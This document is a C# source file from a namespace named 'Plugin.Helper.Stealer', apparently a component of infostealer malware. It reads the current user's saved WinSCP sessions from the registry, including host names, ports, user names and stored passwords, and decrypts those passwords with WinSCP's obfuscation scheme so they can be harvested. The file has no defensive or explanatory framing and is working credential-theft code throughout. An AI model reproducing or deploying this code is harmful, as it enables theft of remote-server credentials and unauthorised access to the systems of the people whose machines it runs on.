

using System.Collections.Generic;
using InvokedCommon.Structs;
using Microsoft.Win32;


namespace Plugin.Helper.Stealer
{
	public static class WinScp
	{
		public static WinScpInfo[] GetInfo()
		{
			object obj1 = Utils.ReadRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security", "UseMasterPassword");
			if (obj1 == null || obj1.GetType() != typeof(int) || (int)obj1 == 1)
				return (WinScpInfo[])null;
			List<WinScpInfo> winScpInfoList = new List<WinScpInfo>();
			RegistryView[] registryViewArray = new RegistryView[2]
			{
		RegistryView.Registry64,
		RegistryView.Registry32
			};
			foreach (RegistryView view in registryViewArray)
			{
				try
				{
					using (RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
					{
						string name = "Software\\Martin Prikryl\\WinSCP 2\\Sessions";
						using (RegistryKey registryKey2 = registryKey1.OpenSubKey(name))
						{
							foreach (string subKeyName in registryKey2.GetSubKeyNames())
							{
								try
								{
									using (RegistryKey registryKey3 = registryKey2.OpenSubKey(subKeyName))
									{
										string _hostname = (string)registryKey3.GetValue("HostName") ?? "";
										string _username = (string)registryKey3.GetValue("UserName") ?? "";
										string str = (string)registryKey3.GetValue("Password") ?? "";
										int _port = 22;
										object obj2 = registryKey3.GetValue("PortNumber");
										if (obj2 != null)
											_port = (int)obj2;
										if (!string.IsNullOrEmpty(str))
											str = WinScp.DecryptData(str).Substring(_hostname.Length + _username.Length);
										if (string.IsNullOrEmpty(_hostname) && string.IsNullOrEmpty(_username))
										{
											if (string.IsNullOrEmpty(str))
												continue;
										}
										winScpInfoList.Add(new WinScpInfo(_hostname, _port, _username, str));
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
				if (winScpInfoList.Count > 0)
					break;
			}
			return winScpInfoList.ToArray();
		}

		private static int DecryptNextChar(List<string> list)
		{
			int num = (int)byte.MaxValue ^ ((int.Parse(list[0]) << 4) + int.Parse(list[1]) ^ 163) & (int)byte.MaxValue;
			list.RemoveRange(0, 2);
			return num;
		}

		private static string DecryptData(string EncryptedData)
		{
			List<string> list = new List<string>();
			char ch;
			for (int index = 0; index < EncryptedData.Length; ++index)
			{
				if (EncryptedData[index] == 'A')
					list.Add("10");
				else if (EncryptedData[index] == 'B')
					list.Add("11");
				else if (EncryptedData[index] == 'C')
					list.Add("12");
				else if (EncryptedData[index] == 'D')
					list.Add("13");
				else if (EncryptedData[index] == 'E')
					list.Add("14");
				else if (EncryptedData[index] == 'F')
				{
					list.Add("15");
				}
				else
				{
					List<string> stringList = list;
					ch = EncryptedData[index];
					string str = ch.ToString();
					stringList.Add(str);
				}
			}
			if (list.Count < 2)
				return (string)null;
			int num1 = WinScp.DecryptNextChar(list);
			int num2;
			if (num1 == (int)byte.MaxValue)
			{
				if (list.Count < 2)
					return (string)null;
				WinScp.DecryptNextChar(list);
				if (list.Count < 2)
					return (string)null;
				num2 = WinScp.DecryptNextChar(list);
			}
			else
				num2 = num1;
			if (list.Count < 2)
				return (string)null;
			int count = WinScp.DecryptNextChar(list) * 2;
			if (count > list.Count)
				return (string)null;
			list.RemoveRange(0, count);
			string str1 = "";
			for (int index = 0; index < num2; ++index)
			{
				if (list.Count < 2)
					return (string)null;
				string str2 = str1;
				ch = (char)WinScp.DecryptNextChar(list);
				string str3 = ch.ToString();
				str1 = str2 + str3;
			}
			return str1;
		}
	}
}